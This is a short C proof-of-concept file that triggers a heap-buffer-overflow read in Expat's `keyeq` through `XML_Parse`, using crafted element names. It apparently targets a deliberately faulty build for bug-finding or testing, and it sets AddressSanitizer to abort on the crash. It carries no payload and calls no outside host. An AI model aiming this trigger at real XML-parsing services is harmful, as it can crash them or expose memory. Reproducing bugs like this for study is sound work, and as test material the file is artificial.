/* PoC: heap-buffer-overflow (read) in `keyeq` reached through `XML_Parse`.
 *
 * Feeds a single well-formed XML document to the public API.  The document
 * first seeds the internal element-type hash table with short names and then
 * looks up long names that extend those stored names.  On the faulty tree,
 * comparing a stored key against a longer extending query reports "equal",
 * and `keyeq` then reads `s2[s1len]` far past the stored key's pool block.
 *
 * Input is in-contract: plain UTF-8 XML, no DTD tricks, no external input.
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include "expat.h"

#define DOC_CAP (8u * 1024u * 1024u)

static char doc[DOC_CAP];

/* Make the sanitizer report fatal (SIGABRT) regardless of environment. */
const char *__asan_default_options(void);

const char *
__asan_default_options(void) {
  return "abort_on_error=1:detect_leaks=0";
}

int
main(void) {
  XML_Parser parser = XML_ParserCreate(NULL);
  if (parser == NULL)
    return 1;
  XML_SetHashSalt(parser, 1);

  char *w = doc;
  w += sprintf(w, "<r>");

  /* Seed the element type hash table with names "a", "aa", "aaa", ... */
  for (int k = 1; k <= 30; k++) {
    *w++ = '<';
    memset(w, 'a', (size_t)k);
    w += k;
    memcpy(w, "/>", 2);
    w += 2;
  }

  /* Then look up long names that extend every stored name. */
  for (int len = 1050; len <= 1600; len++) {
    *w++ = '<';
    memset(w, 'a', (size_t)len);
    w += len;
    memcpy(w, "/>", 2);
    w += 2;
  }

  w += sprintf(w, "</r>");

  if (XML_Parse(parser, doc, (int)(w - doc), 1) == XML_STATUS_ERROR)
    printf("parse error: %s\n", XML_ErrorString(XML_GetErrorCode(parser)));
  else
    printf("parsed\n");

  XML_ParserFree(parser);
  return 0;
}
